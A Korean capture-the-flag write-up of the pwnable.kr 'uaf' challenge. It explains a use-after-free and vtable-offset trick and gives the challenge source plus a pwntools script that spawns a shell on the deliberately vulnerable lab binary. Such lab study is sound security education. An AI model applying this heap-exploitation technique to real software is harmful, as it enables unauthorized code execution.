# [pwnable.kr] uaf

> Mommy, what is Use After Free bug?
>
> ssh uaf@pwnable.kr -p2222 (pw:guest)

## Bug

`Man`과 `Woman`이 할당된 상태의 메모리 구조는 다음과 같다.

![image](https://github.com/user-attachments/assets/60d405de-b511-4975-a0ad-3c5f11bbad3c)

Vtable은 `introduce()`와 `give_shell()`의 주소를 저장하고 있다.

![image](https://github.com/user-attachments/assets/71cda493-724b-44c9-a51b-1e96162cf1ad)

`Man::introduce()`를 호출하는 과정을 보면,

![image](https://github.com/user-attachments/assets/58a00b61-92a7-44d8-b3e3-f2707dd03811)

Chunk로부터 vtable의 주소(`0x401570`)를 가져오고, 그 주소에 8을 더한 위치에 저장된 함수(`introduce()`)를 호출한다. 이 과정은 `Man`과 `Woman`이 free된 상태에서도 동일하게 진행된다.

```c++
/* uaf.cpp */

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

`3. free`로 `m`과 `w`를 삭제하면 size가 `0x20`인 chunk 두 개가 free된다. 이 상태에서 `2. after`로 size가 `0x20`인 chunk를 두 번 할당받으면 삭제된 순서의 반대로 `w`와 `m`이 할당된다. Chunk에는 임의의 파일의 내용을 넣을 수 있기 때문에, `Man`의 vtable 주소가 원래보다 8만큼 작아지게 한 후 `1. use`를 실행하면 `introduce()`보다 8바이트만큼 앞쪽에 있는 `give_shell()`이 호출되어 shell을 획득할 수 있다.

## Exploit

![image](https://github.com/user-attachments/assets/c285edb5-e545-4aa9-8931-da8a622d289b)

```python
from pwn import *

p = ssh("uaf", "pwnable.kr", 2222, "guest").process(
    ["/home/uaf/uaf", str(3), "/tmp/h0meb0dy/payload"]
)

sl = p.sendline


def use():
    sl(b"1")


def after():
    sl(b"2")


def free():
    sl(b"3")


free()  # free Man and Woman
after()  # allocate Woman
after()  # allocate Man (sub 8 from vtable)
use()  # call give_shell()

p.interactive()
```

![image](https://github.com/user-attachments/assets/9b83f001-124a-40ce-aa0a-9e7e10863501)
